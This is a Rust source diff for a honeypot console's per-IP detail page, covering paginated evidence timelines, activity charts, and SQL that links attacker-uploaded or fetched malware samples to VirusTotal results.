+            raw_score => format!("{:.1}", score.raw_score),
+            raw_score_pct => crate::routes::format::score_pct(raw_f64),
+            effective_score => format!("{:.1}", effective),
+            effective_score_pct => crate::routes::format::score_pct(effective_f64),
+            tier => score.tier.map(tier_label).unwrap_or("-"),
+            eligible => score.eligible,
+            // Which way the delist control points. Delisting is reversible by design ("until you say
+            // otherwise"), so the page has to be able to offer the reverse - see `routes::queue`'s
+            // `relist`.
+            delisted => score.delisted,
+            recommended_for_vendor => score.recommended_for_vendor,
+            recommended_for_blocklist => score.recommended_for_blocklist,
+            has_confirmed_real => score.has_confirmed_real,
+            event_count => score.event_count,
+            distinct_categories => score.distinct_categories,
+            distinct_wan_count => score.distinct_wan_count,
+            distinct_sensor_count => score.distinct_sensor_count,
+            // Persistence: distinct active days and the score-point bonus they earn. Shown so a tier
+            // driven by persistence (raw below the tier floor, but many active days) is legible rather
+            // than looking like a contradiction.
+            active_days => score.active_days,
+            persistence_bonus => format!("{:.0}", persistence_points(score.active_days as i64)),
+            max_confidence => format!("{:.3}", score.max_confidence),
+            first_seen => format_timestamp(score.first_seen),
+            last_seen => format_timestamp(score.last_seen),
+            session_folds,
+            ungrouped,
+            timeline_counts,
+            has_more_events,
+            next_cursor,
+            per_wan,
+            categories,
+            submissions,
+            services,
+            malware,
+            via_other_reporters,
+            urls,
+            external_links,
+            geo,
+            rdns,
+            ip_timeline_labels,
+            ip_timeline_data,
+            current_range,
+            campaigns,
+            techniques,
+            campaign_indexer_behind => newest.saturating_sub(indexed),
+        })
+    })?;
+    Ok(Html(html).into_response())
+}
+
+/// `GET /ip/{ip}/events?cursor=<observed_at>,<id>` - the "Load more" HTMX endpoint for the
+/// evidence timeline (module doc comment). `cursor` is `None` on a malformed or unparsable value
+/// (fails closed: a bad cursor returns an empty fragment rather than guessing a start point that
+/// could duplicate or skip rows already on the page) as well as when the parameter is entirely
+/// absent, which real "Load more" clicks never send - the button's own `next_cursor` always comes
+/// from `format_cursor` - but a defensive default all the same.
+async fn events_fragment(
+    State(state): State<AppState>,
+    Path(ip): Path<IpAddr>,
+    Query(params): Query<EventsCursorQuery>,
+) -> Result<Html<String>, AppError> {
+    let cursor = match params.cursor.as_deref() {
+        None => None,
+        Some(raw) => match parse_cursor(raw) {
+            Some(c) => Some(c),
+            None => {
+                tracing::warn!(%ip, cursor = raw, "malformed events pagination cursor; returning empty fragment");
+                return Ok(Html(String::new()));
+            }
+        },
+    };
+
+    let mut events = fetch_evidence_rows(&state.db, ip, cursor).await?;
+    // A fragment has no page banner; the failure is logged and the full page names the panel.
+    Degraded::new().soft(
+        "download outcomes",
+        attach_fetch_outcomes(&state.db, &mut events).await,
+    );
+    Degraded::new().soft(
+        "command replies",
+        attach_replies(&state.db, &mut events).await,
+    );
+    let has_more_events = events.len() as i64 == EVIDENCE_PAGE_SIZE;
+    let next_cursor = events
+        .last()
+        .map(|e| format_cursor(e.raw_observed_at, e.id));
+    // No auto-expanded card on a "Load more" page - `recent_expanded: 0` - unlike the initial
+    // page load's newest-first cards, these are all strictly older than what is already on
+    // screen, so none of them is "the current activity" an operator lands on an open view of.
+    let (mut sessions, ungrouped) = core_scoring::off_worker(|| group_into_sessions(events, 0));
+    Degraded::new().soft(
+        "session techniques",
+        attach_session_tags(&state.db, &mut sessions).await,
+    );
+    let session_folds = core_scoring::off_worker(|| fold_repeated_sessions(sessions));
+
+    let tmpl = state.templates.get_template("events_fragment.html")?;
+    // Rendering escapes every row's raw-JSON block: tens of ms for a page of large captures.
+    let html = core_scoring::off_worker(|| {
+        tmpl.render(context! {
+            ip => ip.to_string(),
+            session_folds,
+            ungrouped,
+            has_more_events,
+            next_cursor,
+        })
+    })?;
+    Ok(Html(html))
+}
+
+/// `GET /ip/{ip}/chart?range=<24h|7d|30d>` - the range-selector HTMX endpoint for the per-IP
+/// activity chart (module doc comment). Renders the same fragment template `detail`'s initial page
+/// load includes, so the two never drift into two different chart markups.
+async fn chart_fragment(
+    State(state): State<AppState>,
+    Path(ip): Path<IpAddr>,
+    Query(params): Query<ChartRangeQuery>,
+) -> Result<Html<String>, AppError> {
+    let current_range = normalize_detail_range(params.range.as_deref());
+    // A fragment has no page banner; the failure is logged and the full page names the panel.
+    let (labels, data) = Degraded::new().soft(
+        "activity timeline",
+        detail_chart_series(&state.db, ip, current_range).await,
+    );
+    let ip_timeline_labels = script_json(&labels);
+    let ip_timeline_data = script_json(&data);
+
+    let tmpl = state.templates.get_template("detail_chart_fragment.html")?;
+    let html = tmpl.render(context! {
+        current_range,
+        ip_timeline_labels,
+        ip_timeline_data,
+        // Both needed by the out-of-band range-selector swap: `ip` builds each button's
+        // hx-get URL, `is_fragment` gates the block off on the full-page render.
+        ip => ip.to_string(),
+        is_fragment => true,
+    })?;
+    Ok(Html(html))
+}
+
+#[derive(Debug, Deserialize)]
+struct EventsCursorQuery {
+    #[serde(default)]
+    cursor: Option<String>,
+}
+
+/// The one query param `detail` reads: `?drawer=1` marks the evidence-drawer HTMX request (see
+/// `detail`). Any presence of the param counts; its value is unused.
+#[derive(Debug, Deserialize)]
+struct DetailQuery {
+    #[serde(default)]
+    drawer: Option<String>,
+}
+
+#[derive(Debug, Deserialize)]
+struct ChartRangeQuery {
+    #[serde(default)]
+    range: Option<String>,
+}
+
+/// Normalizes the `?range=` query param to one of the three range-selector buttons
+/// (`templates/detail.html`'s `chart-range` selector); anything else - missing, malformed, or a
+/// value from a future/removed button - falls back to the same "7d" default `detail`'s own initial
+/// render uses, rather than erroring on an operator-editable query string.
+fn normalize_detail_range(raw: Option<&str>) -> &'static str {
+    match raw {
+        Some("24h") => "24h",
+        Some("30d") => "30d",
+        _ => "7d",
+    }
+}
+
+async fn detail_chart_series(
+    db: &PgPool,
+    ip: IpAddr,
+    range: &str,
+) -> Result<(Vec<String>, Vec<i64>), sqlx::Error> {
+    match range {
+        "24h" => detail_hourly_series(db, ip).await,
+        "30d" => detail_daily_series(db, ip, 29).await,
+        _ => detail_daily_series(db, ip, 6).await,
+    }
+}
+
+/// `days + 1` daily buckets (oldest to newest, zero-filled) for this IP's activity chart - shared
+/// by `detail`'s default 7-day render (`days: 6`) and `chart_fragment`'s "7d"/"30d" buttons.
+/// Soft-fails to two empty vectors on a query error, per the module doc comment's chart policy.
+async fn detail_daily_series(
+    db: &PgPool,
+    ip: IpAddr,
+    days: i32,
+) -> Result<(Vec<String>, Vec<i64>), sqlx::Error> {
+    let rows = sqlx::query(
+        "SELECT bucket::date AS bucket, COALESCE(cnt, 0) AS cnt \
+         FROM generate_series(current_date - ($2::int * interval '1 day'), current_date, interval '1 day') AS bucket \
+         LEFT JOIN ( \
+             SELECT date_trunc('day', observed_at)::date AS day, COUNT(*) AS cnt \
+             FROM event \
+             WHERE source_ip = $1::inet AND observed_at >= current_date - ($2::int * interval '1 day') \
+             GROUP BY day \
+         ) sub ON sub.day = bucket::date \
+         ORDER BY bucket",
+    )
+    .bind(ip.to_string())
+    .bind(days)
+    .fetch_all(db)
+    .await?;
+    let mut labels = Vec::with_capacity(rows.len());
+    let mut data = Vec::with_capacity(rows.len());
+    for row in rows {
+        let (Ok(bucket), Ok(cnt)) = (
+            row.try_get::<NaiveDate, _>("bucket"),
+            row.try_get::<i64, _>("cnt"),
+        ) else {
+            continue;
+        };
+        labels.push(bucket.format("%b %-d").to_string());
+        data.push(cnt);
+    }
+    Ok((labels, data))
+}
+
+/// 24 hourly buckets (oldest to newest, zero-filled) for this IP's activity chart -
+/// `chart_fragment`'s "24h" button, mirroring `routes::dashboard`'s own site-wide hourly timeline
+/// query but scoped to one IP.
+async fn detail_hourly_series(
+    db: &PgPool,
+    ip: IpAddr,
+) -> Result<(Vec<String>, Vec<i64>), sqlx::Error> {
+    let rows = sqlx::query(
+        "SELECT bucket, COALESCE(cnt, 0) AS cnt \
+         FROM generate_series( \
+             date_trunc('hour', now()) - interval '23 hours', \
+             date_trunc('hour', now()), \
+             interval '1 hour' \
+         ) AS bucket \
+         LEFT JOIN ( \
+             SELECT date_trunc('hour', observed_at) AS hour, COUNT(*) AS cnt \
+             FROM event WHERE source_ip = $1::inet AND observed_at >= now() - interval '24 hours' \
+             GROUP BY hour \
+         ) sub ON sub.hour = bucket \
+         ORDER BY bucket",
+    )
+    .bind(ip.to_string())
+    .fetch_all(db)
+    .await?;
+    let mut labels = Vec::with_capacity(rows.len());
+    let mut data = Vec::with_capacity(rows.len());
+    for row in rows {
+        let (Ok(bucket), Ok(cnt)) = (
+            row.try_get::<DateTime<Utc>, _>("bucket"),
+            row.try_get::<i64, _>("cnt"),
+        ) else {
+            continue;
+        };
+        labels.push(bucket.format("%H:00").to_string());
+        data.push(cnt);
+    }
+    Ok((labels, data))
+}
+
+/// Fetches up to [`EVIDENCE_PAGE_SIZE`] `event` rows for `ip`, newest first, optionally starting
+/// strictly after a `(observed_at, id)` keyset cursor (`detail`'s doc comment explains why keyset
+/// rather than `OFFSET`). Both `detail`'s first page and `events_fragment`'s subsequent ones call
+/// this - one query shape, one row-decoding path, so a future column addition only has to change
+/// one place. The `id` tiebreak in `ORDER BY` (added by console-forensics task 4; task 3's original
+/// query sorted on `observed_at` alone) is load-bearing for pagination correctness: several events
+/// can share the same `observed_at` value, and without a deterministic secondary sort a page
+/// boundary drawn between two same-timestamp rows could re-serve or skip one on the next page.
+async fn fetch_evidence_rows(
+    db: &PgPool,
+    ip: IpAddr,
+    cursor: Option<(DateTime<Utc>, i64)>,
+) -> Result<Vec<EventRow>, AppError> {
+    let rows =
+        match cursor {
+            Some((cursor_time, cursor_id)) => sqlx::query(
+                "SELECT id, host(wan_ip) AS wan_ip, sensor, signal_type, protocol, authenticated, \
+                        observed_at, metadata, session_id::text AS session_id \
+                 FROM event WHERE source_ip = $1::inet AND (observed_at, id) < ($2, $3) \
+                 ORDER BY observed_at DESC, id DESC LIMIT $4",
+            )
+            .bind(ip.to_string())
+            .bind(cursor_time)
+            .bind(cursor_id)
+            .bind(EVIDENCE_PAGE_SIZE)
+            .fetch_all(db)
+            .await?,
+            None => sqlx::query(
+                "SELECT id, host(wan_ip) AS wan_ip, sensor, signal_type, protocol, authenticated, \
+                        observed_at, metadata, session_id::text AS session_id \
+                 FROM event WHERE source_ip = $1::inet \
+                 ORDER BY observed_at DESC, id DESC LIMIT $2",
+            )
+            .bind(ip.to_string())
+            .bind(EVIDENCE_PAGE_SIZE)
+            .fetch_all(db)
+            .await?,
+        };
+
+    // Decoding each row's JSON metadata and pretty-printing it for the "raw" toggle is CPU work in
+    // proportion to the rows' size, and an attacker chooses that size (a captured HTTP or SMTP body
+    // is kept up to 64 KiB, 200 rows a page), so it runs off the async workers.
+    core_scoring::off_worker(|| {
+        let mut events = Vec::with_capacity(rows.len());
+        for row in rows {
+            events.push(build_event(EvidenceRow {
+                id: row.try_get("id")?,
+                wan_ip: row.try_get("wan_ip")?,
+                sensor: row.try_get("sensor")?,
+                signal_type: row.try_get("signal_type")?,
+                protocol: row.try_get("protocol")?,
+                authenticated: row.try_get("authenticated")?,
+                observed_at: row.try_get("observed_at")?,
+                metadata: row.try_get("metadata")?,
+                session_id: row.try_get("session_id")?,
+            }));
+        }
+        Ok::<_, sqlx::Error>(events)
+    })
+    .map_err(AppError::from)
+}
+
+/// One `event` row as the database returns it, before display formatting.
+struct EvidenceRow {
+    id: i64,
+    wan_ip: Option<String>,
+    sensor: String,
+    signal_type: SignalType,
+    protocol: Protocol,
+    authenticated: bool,
+    observed_at: DateTime<Utc>,
+    metadata: serde_json::Value,
+    session_id: Option<String>,
+}
+
+/// Formats one evidence row for display. Pure CPU, linear in the metadata's size.
+fn build_event(raw: EvidenceRow) -> EventRow {
+    let EvidenceRow {
+        id,
+        wan_ip,
+        sensor,
+        signal_type,
+        protocol,
+        authenticated,
+        observed_at,
+        metadata,
+        session_id,
+    } = raw;
+    let signal_snake = signal_type_snake(signal_type);
+    let metadata_json =
+        serde_json::to_string_pretty(&metadata).unwrap_or_else(|_| "{}".to_string());
+    EventRow {
+        id,
+        observed_at: format_timestamp(observed_at),
+        relative_time: format_relative_time(observed_at),
+        activity: format_activity(&sensor, &signal_snake),
+        detail: extract_detail(&signal_snake, &metadata),
+        xor_badge: metadata
+            .get("xor_key")
+            .and_then(|v| v.as_u64())
+            .map(|k| format!("0x{k:02x}")),
+        lines: command_lines(&metadata),
+        lines_truncated: metadata
+            .get("command_lines_truncated")
+            .and_then(|v| v.as_bool())
+            .unwrap_or(false),
+        reply: None,
+        fetch: None,
+        protocol: protocol_label(protocol).to_string(),
+        authenticated,
+        wan_ip: wan_ip.unwrap_or_else(|| "-".to_string()),
+        metadata_json,
+        session_id,
+        raw_observed_at: observed_at,
+        sensor_raw: sensor,
+        signal_type_raw: signal_snake,
+        metadata,
+    }
+}
+
+/// The synchronous half of an evidence page after its rows are fetched: group the events into
+/// sessions, fold repeats and render `events_fragment.html`. The page's session-technique tags
+/// (a database read) are not part of it, so a measurement with no database is a lower bound that
+/// misses only that read's few rows.
+#[doc(hidden)]
+pub fn measure_evidence_fragment(
+    templates: &minijinja::Environment<'static>,
+    metadata: Vec<serde_json::Value>,
+) -> usize {
+    let observed_at = Utc::now();
+    let events: Vec<EventRow> = metadata
+        .into_iter()
+        .enumerate()
+        .map(|(i, metadata)| {
+            build_event(EvidenceRow {
+                id: i as i64,
+                wan_ip: Some("203.0.113.9".into()),
+                sensor: "http".into(),
+                signal_type: SignalType::HoneypotCommandExec,
+                protocol: Protocol::Tcp,
+                authenticated: false,
+                observed_at,
+                metadata,
+                session_id: Some(format!("00000000-0000-0000-0000-{:012}", i / 10)),
+            })
+        })
+        .collect();
+    let (sessions, ungrouped) = group_into_sessions(events, 0);
+    let session_folds = fold_repeated_sessions(sessions);
+    templates
+        .get_template("events_fragment.html")
+        .and_then(|t| {
+            t.render(context! {
+                ip => "203.0.113.9",
+                session_folds,
+                ungrouped,
+                has_more_events => false,
+                next_cursor => "",
+            })
+        })
+        .map(|html| html.len())
+        .unwrap_or(0)
+}
+
+/// Fetches up to [`MALWARE_PAGE_SIZE`] `fetch_attempt` rows whose `source_ip` is this IP, newest
+/// first by `last_attempt`, LEFT JOINed against `sample_analysis` on the captured payload's
+/// sha256 - the link that ties the attacker IP, the download URL it fed a fetcher, and the
+/// VirusTotal verdict on what actually came back, today shown as three unrelated things.
+///
+/// TYPE MISMATCH: `fetch_attempt.sha256` is `BYTEA` (the raw digest, NULL unless a body was
+/// captured - `crates/review/migrations/0003_fetch_attempt.sql`); `sample_analysis.sha256` is
+/// lowercase-hex `TEXT` (`crates/core-scoring/migrations/0009_sample_analysis.sql`). The join
+/// goes through `encode(fa.sha256, 'hex')`, confirmed against a live database
+/// (`encode(bytea,'hex')` always lowercases) and against both write paths: `fetch_attempt.sha256`
+/// is written from `Sha256::digest(...)` raw bytes and its spool filename from
+/// `review::fetcher::to_hex`'s `{b:02x}` formatting (`crates/review/src/fetcher/mod.rs`), and
+/// `sample_analysis.sha256` (`review::virustotal`) is keyed directly off that same lowercase-hex
+/// spool filename - so both sides are lowercase hex of the same digest by construction, never
+/// merely by convention.
+///
+/// LEFT JOIN, not INNER: a fetch that never captured a body (rejected/dead/timeout/too_big/
+/// empty/pending) or one that captured a body VirusTotal has not scanned yet still has a
+/// `fetch_attempt` row worth showing, with `detected`/`total`/`vt_link`/`analyzed_at` all `None` -
+/// a failed or unscanned fetch is evidence too, not something to hide behind an INNER JOIN's
+/// silent drop.
+///
+/// ATTRIBUTION CAVEAT (do not remove without re-reading the migration and
+/// `crates/review/src/fetcher/store.rs`'s upsert): `fetch_attempt`'s primary key is `url_hash`
+/// alone, inserted `ON CONFLICT (url_hash) DO NOTHING`, so `source_ip` records only the FIRST
+/// attacker whose event queued a given URL for fetching. A later IP that references the exact
+/// same URL is never linked here - this panel is "malware fetched from URLs this IP was the
+/// first to report", not "every malicious URL this IP has ever referenced". The template carries
+/// the same caveat visibly, so the UI never overstates the attribution.
+async fn fetch_malware_rows(db: &PgPool, ip: IpAddr) -> Result<Vec<MalwareRow>, AppError> {
+    // Two ways a sample is attributable to an address, unioned so the panel shows both:
+    //
+    // 1. UPLOADED - the address handed the body to a sensor (FTP STOR, SSH/SCP, ADB push). The
+    //    event itself carries the sha, so this is a first-party observation, the strongest link
+    //    there is. It was missing until an FTP attacker uploaded three samples and the panel still
+    //    read "not linked" - the sensor had the evidence, the panel just never asked for it.
+    //    One row per sha, not per event: an attacker re-uploading one body sixty times used to
+    //    fill the whole page with it and push its other samples off the panel.
+    // 2. FETCHED - the fetcher retrieved a URL this address reported. Weaker: it is the FIRST
+    //    reporter of that url, not necessarily every one that referenced it.
+    //
+    // `origin` distinguishes them in the UI so an operator is never shown an inference where a
+    // direct observation exists, or the reverse.
+    let rows = sqlx::query(MALWARE_SQL)
+        .bind(ip.to_string())
+        .bind(MALWARE_PAGE_SIZE)
+        .fetch_all(db)
+        .await?;
+
+    let mut malware = Vec::with_capacity(rows.len());
+    for row in rows {
+        let sha256_hex: Option<String> = row.try_get("sha256_hex")?;
+        let bytes: Option<i32> = row.try_get("bytes")?;
+        let analyzed_at: Option<DateTime<Utc>> = row.try_get("analyzed_at")?;
+        let status: String = row.try_get("status")?;
+        // The wire label is snake_case so it stays a stable key; the panel is read by a person.
+        // Only shown against a capture that did NOT finish: "captured (peer closed)" tells an
+        // operator nothing they cannot already see.
+        let end_reason: Option<String> = row
+            .try_get::<Option<String>, _>("end_reason")?
+            .filter(|_| status.contains("incomplete"));
+        malware.push(MalwareRow {
+            origin: row.try_get("origin")?,
+            url: row.try_get("url")?,
+            host: row.try_get("host")?,
+            pinned_ip: row.try_get("pinned_ip")?,
+            status,
+            end_reason: end_reason.map(|r| r.replace('_', " ")),
+            bytes: bytes.map(|b| format_bytes(b.max(0) as u64)),
+            sha256_short: sha256_hex
+                .as_ref()
+                .map(|s| s[..s.len().min(12)].to_string()),
+            sha256: sha256_hex,
+            detected: row.try_get("detected")?,
+            total: row.try_get("total")?,
+            vt_link: row.try_get("vt_link")?,
+            analyzed_at: analyzed_at.map(format_timestamp),
+        });
+    }
+    Ok(malware)
+}
+
+/// [`fetch_malware_rows`]'s statement; `$1` is the address, `$2` the page size. The uploaded arm
+/// states `event_sample_sha_idx`'s predicate (`metadata ? 'sample_sha256'`, core-scoring migration
+/// 0023) so the address's sample events are read through that index rather than by reading all of
+/// its events and testing each one's metadata (226 ms for an address with 187,000 events on a
+/// 1,500,000-event ledger; 20 ms with the index).
+pub const MALWARE_SQL: &str = "SELECT 'uploaded' AS origin, \
+                max(coalesce(e.metadata->>'sample_orig_name', '')) AS url, \
+                max(e.sensor) AS host, \
+                NULL::text AS pinned_ip, \
+                CASE WHEN bool_or(coalesce((e.metadata->>'truncated')::boolean, false)) \
+                      AND NOT bool_and(coalesce((e.metadata->>'complete')::boolean, true)) \
+                     THEN 'truncated, incomplete' \
+                     WHEN bool_or(coalesce((e.metadata->>'truncated')::boolean, false)) \
+                     THEN 'truncated' \
+                     WHEN NOT bool_and(coalesce((e.metadata->>'complete')::boolean, true)) \
+                     THEN 'incomplete' ELSE 'captured' END AS status, \
+                CASE WHEN count(e.metadata->>'end_reason') = count(*) \
+                      AND count(DISTINCT e.metadata->>'end_reason') = 1 \
+                     THEN max(e.metadata->>'end_reason') END AS end_reason, \
+                max((e.metadata->>'sample_size')::int) AS bytes, \
+                e.metadata->>'sample_sha256' AS sha256_hex, \
+                sa.detected, sa.total, sa.vt_link, sa.analyzed_at, \
+                max(e.observed_at) AS sort_at \
+         FROM event e \
+         LEFT JOIN sample_analysis sa ON e.metadata->>'sample_sha256' = sa.sha256 \
+         WHERE e.source_ip = $1::inet AND e.metadata ? 'sample_sha256' \
+           AND e.metadata->>'sample_sha256' IS NOT NULL \
+         GROUP BY e.metadata->>'sample_sha256', sa.sha256 \
+         UNION ALL \
+         SELECT 'fetched' AS origin, fa.url, fa.host, fa.pinned_ip, fa.status, \
+                NULL::text AS end_reason, fa.bytes, \
+                encode(fa.sha256, 'hex') AS sha256_hex, \
+                sa.detected, sa.total, sa.vt_link, sa.analyzed_at, \
+                fa.last_attempt AS sort_at \
+         FROM fetch_attempt fa \
+         LEFT JOIN sample_analysis sa ON encode(fa.sha256, 'hex') = sa.sha256 \
+         WHERE fa.source_ip = $1::inet \
+         ORDER BY sort_at DESC LIMIT $2";
+
+/// A sample the fetcher captured from a URL this address also reported, but which the fetcher
+/// credited to another address (`fetch_attempt` keeps only the first reporter), so the
+/// "Malware from this IP" panel does not list it.
+#[derive(Debug, PartialEq, Serialize)]
+struct ViaOtherReporter {
+    sha256: String,
+    short: String,
+}
+
+/// The distinct captured samples of `urls` whose first reporter was not this address, leaving out
+/// any the malware panel already lists. Without this the panel reads "no samples" next to a URL
+/// table that shows one.
+fn samples_via_other_reporters(malware: &[MalwareRow], urls: &[UrlRow]) -> Vec<ViaOtherReporter> {
+    let mut out: Vec<ViaOtherReporter> = Vec::new();
+    for u in urls {
+        let (Some(sha), Some(_)) = (&u.sha256, &u.first_reporter) else {
+            continue;
+        };
+        let listed = malware.iter().any(|m| m.sha256.as_ref() == Some(sha));
+        if !listed && !out.iter().any(|o| &o.sha256 == sha) {
+            out.push(ViaOtherReporter {
+                sha256: sha.clone(),
+                short: sha.chars().take(12).collect(),
+            });
+        }
+    }
+    out
+}
+
+/// Every URL this IP told a shell to fetch, one row per distinct URL, joined to the fetcher's
+/// record of that URL by the URL itself (`fetch_attempt.url_hash` is `sha256(trim(url))`, see
+/// `review::fetcher::store::url_hash`), not by reporter. `fetch_attempt` keeps one row per URL
+/// and credits it to the first address that reported it, so the panel above cannot show a later
+/// attacker the capture its own URL already produced; this one can, with the capture's date, since
+/// the URL may not serve the same bytes today. A URL with no row is either one the fetcher never
+/// handles (an `ftp://` target, by design) or one that was never queued.
+async fn fetch_url_rows(db: &PgPool, ip: IpAddr) -> Result<Vec<UrlRow>, AppError> {
+    let rows = sqlx::query(
+        "SELECT u.url, u.seen_count, u.first_seen, u.last_seen, \
+                fa.status, fa.reject_reason, fa.attempts, fa.last_attempt, \
+                fa.first_seen AS queued_at, host(fa.source_ip) AS reporter, fa.bytes, \
+                encode(fa.sha256, 'hex') AS sha256_hex, \
+                sa.detected, sa.total, sa.vt_link \
+         FROM (SELECT btrim(e.metadata->>'url') AS url, count(*) AS seen_count, \
+                      min(e.observed_at) AS first_seen, max(e.observed_at) AS last_seen \
+               FROM event e \
+               WHERE e.source_ip = $1::inet \
+                 AND e.signal_type = 'honeypot_file_download' \
+                 AND e.metadata->>'url' IS NOT NULL \
+               GROUP BY btrim(e.metadata->>'url')) u \
+         LEFT JOIN fetch_attempt fa ON fa.url_hash = sha256(convert_to(u.url, 'UTF8')) \
+         LEFT JOIN sample_analysis sa ON encode(fa.sha256, 'hex') = sa.sha256 \
+         ORDER BY u.last_seen DESC LIMIT $2",
+    )
+    .bind(ip.to_string())
+    .bind(MALWARE_PAGE_SIZE)
+    .fetch_all(db)
+    .await?;
+
+    let this_ip = ip.to_string();
+    let mut urls = Vec::with_capacity(rows.len());
+    for row in rows {
+        let url: String = row.try_get("url")?;
+        let status: Option<String> = row.try_get("status")?;
+        let reject_reason: Option<String> = row.try_get("reject_reason")?;
+        let attempts: Option<i32> = row.try_get("attempts")?;
+        let last_attempt: Option<DateTime<Utc>> = row.try_get("last_attempt")?;
+        let queued_at: Option<DateTime<Utc>> = row.try_get("queued_at")?;
+        let reporter: Option<String> = row.try_get("reporter")?;
+        let bytes: Option<i32> = row.try_get("bytes")?;
+        let sha256_hex: Option<String> = row.try_get("sha256_hex")?;
+        let first_seen: DateTime<Utc> = row.try_get("first_seen")?;
+        let last_seen: DateTime<Utc> = row.try_get("last_seen")?;
+
+        // `last_attempt` is NOT NULL, so it is present exactly when the join found a row.
+        let record = match (status, last_attempt) {
+            (Some(status), Some(last_attempt)) => Some(FetchRecord {
+                status,
+                reject_reason,
+                attempts: attempts.unwrap_or(0),
+                last_attempt,
+                sha256_hex: None,
+                bytes: None,
+            }),
+            _ => None,
+        };
+        let (kind, outcome) = classify_fetch(&url, record.as_ref());
+        urls.push(UrlRow {
+            url,
+            seen_count: row.try_get("seen_count")?,
+            first_seen: format_timestamp(first_seen),
+            last_seen: format_timestamp(last_seen),
+            kind: kind.to_string(),
+            outcome,
+            first_reporter: reporter.filter(|r| *r != this_ip),
+            queued_at: queued_at.map(format_timestamp),
+            bytes: bytes.map(|b| format_bytes(b.max(0) as u64)),
+            sha256_short: sha256_hex
+                .as_ref()
+                .map(|s| s[..s.len().min(12)].to_string()),
+            sha256: sha256_hex,
+            detected: row.try_get("detected")?,
+            total: row.try_get("total")?,
+            vt_link: row.try_get("vt_link")?,
+        });
+    }
+    Ok(urls)
+}
+
+/// Parses a `?cursor=<observed_at>,<id>` value (`format_cursor`'s own output - see that function's
+/// doc comment for why the timestamp half is always `Z`-suffixed) back into the pair
+/// `fetch_evidence_rows` binds into its `(observed_at, id) < (...)` predicate. `None` on any
+/// malformed input; `events_fragment` fails closed on that rather than guessing a start point.
+/// `pub(crate)` because `routes::search` (console-forensics task 5) reuses the same cursor
+/// encoding for event search pagination - see that module's doc comment.
+pub(crate) fn parse_cursor(raw: &str) -> Option<(DateTime<Utc>, i64)> {
+    let (time_part, id_part) = raw.split_once(',')?;
+    let observed_at = DateTime::parse_from_rfc3339(time_part)
+        .ok()?
+        .with_timezone(&Utc);
+    let id = id_part.parse::<i64>().ok()?;
+    Some((observed_at, id))
+}
+
+/// Renders the keyset cursor for the row `(observed_at, id)` - the last row of a page - as the
+/// `?cursor=` value the next "Load more" click sends. Always forces the UTC `Z` suffix
+/// (`to_rfc3339_opts(.., true)`) rather than chrono's default `+00:00`: the button's `hx-get` href
+/// carries this string verbatim in a query string, and axum's `Query` extractor decodes query
+/// values as `application/x-www-form-urlencoded`, where an unescaped `+` means a literal space -
+/// `+00:00` would silently corrupt into `<space>00:00` and fail to parse back. No comma or `+`
+/// ever appears in the formatted output, so no URL-encoding is needed for the value to round-trip.
+pub(crate) fn format_cursor(observed_at: DateTime<Utc>, id: i64) -> String {
+    format!(
+        "{},{id}",
+        observed_at.to_rfc3339_opts(SecondsFormat::Micros, true)
+    )
+}
+
+/// Every category ever contributed for this IP, with its CURRENT (live-decayed) weight - not
+/// filtered to only those still above the eligibility engine's 0.5 live floor. A category that
+/// has since decayed away is still real evidence history; hiding it here would make the detail
+/// page (the one place meant to show the full picture) less complete than the queue's own
+/// category summary.
+fn category_rows(breakdown: &serde_json::Value) -> Vec<CategoryRow> {
+    let Ok(map) = serde_json::from_value::<BTreeMap<Category, CategoryStatView>>(breakdown.clone())
+    else {
+        return Vec::new();
+    };
+    map.into_iter()
+        .map(|(category, stat)| CategoryRow {
+            category: format!("{category:?}").to_lowercase(),
+            weight: format!("{:.1}", stat.weight),
+            max_confidence: format!("{:.3}", stat.max_confidence),
+        })
+        .collect()
+}
+
+/// Human label for a sensor's `sensor` field, e.g. `cred-vnc` -> `VNC (5900)`. The canonical sensor
+/// names come from the deployment's `PROPOLIS_SENSOR_LOGS` map (see `INSTALL.md`); an unknown sensor
+/// (a renamed or future one) falls back to its raw name rather than being dropped, so the panel
+/// never hides activity it cannot label. `catchall` covers many ports, so it is labelled as a scan
+/// rather than a single port.
+fn service_label(sensor: &str) -> String {
+    let label = match sensor {
+        "ssh" => "SSH (22)",
+        "telnet" => "Telnet (23)",
+        "http" => "HTTP (80)",
+        "ftp" => "FTP (21)",
+        "smtp" => "SMTP (25)",
+        "tftp" => "TFTP (69/udp)",
+        "mqtt" => "MQTT (1883)",
+        "dns" => "DNS (53)",
+        "redis" => "Redis (6379)",
+        "adb" => "ADB (5555)",
+        "cred-vnc" => "VNC (5900)",
+        "cred-mysql" => "MySQL (3306)",
+        "cred-mssql" => "MSSQL (1433)",
+        "cred-pg" => "PostgreSQL (5432)",
+        "cred-mongo" => "MongoDB (27017)",
+        "catchall" => "Catch-all (port scan)",
+        other => return other.to_string(),
+    };
+    label.to_string()
+}
+
+/// The operator-initiated external lookup links shown on the detail page. Each opens in the
+/// operator's own browser (`target=_blank`), so the honeypot never makes the request itself and
+/// never leaks which addresses it has captured. `ip` is an already-validated `IpAddr` (the route's
+/// path param), so its string form is safe to interpolate into the URL with no escaping concern.
+fn external_lookup_links(ip: IpAddr) -> Vec<ExternalLink> {
+    let ip = ip.to_string();
+    [
+        ("Shodan", format!("https://www.shodan.io/host/{ip}")),
+        ("GreyNoise", format!("https://viz.greynoise.io/ip/{ip}")),
+        ("AbuseIPDB", format!("https://www.abuseipdb.com/check/{ip}")),
+        (
+            "VirusTotal",
+            format!("https://www.virustotal.com/gui/ip-address/{ip}"),
+        ),
+    ]
+    .into_iter()
+    .map(|(name, url)| ExternalLink {
+        name: name.to_string(),
+        url,
+    })
+    .collect()
+}
+
+/// `core_scoring::SignalType`'s `Debug` output is `PascalCase` (e.g. `HoneypotCommandExec`); the
+/// DB's `signal_type_enum` and this module's own `extract_detail`/`format_activity` match arms
+/// both key on the wire's `snake_case` spelling (`honeypot_command_exec`), so every caller that
+/// needs the string form converts through here rather than re-deriving the fold independently.
+/// `pub(crate)` because `routes::search` (console-forensics task 5) reuses it for the same
+/// conversion on event search result rows.
+pub(crate) fn signal_type_snake(signal_type: SignalType) -> String {
+    let pascal = format!("{signal_type:?}");
+    pascal.chars().fold(String::new(), |mut s, c| {
+        if c.is_uppercase() && !s.is_empty() {
+            s.push('_');
+        }
+        s.push(c.to_ascii_lowercase());
+        s
+    })
+}
+
+/// The events a connection or login summary stands for (`event_summary: true`,
+/// `suppressed_count`), `None` for an ordinary event.
+fn summary_events(metadata: &serde_json::Value) -> Option<u64> {
+    (metadata.get("event_summary") == Some(&serde_json::Value::Bool(true)))
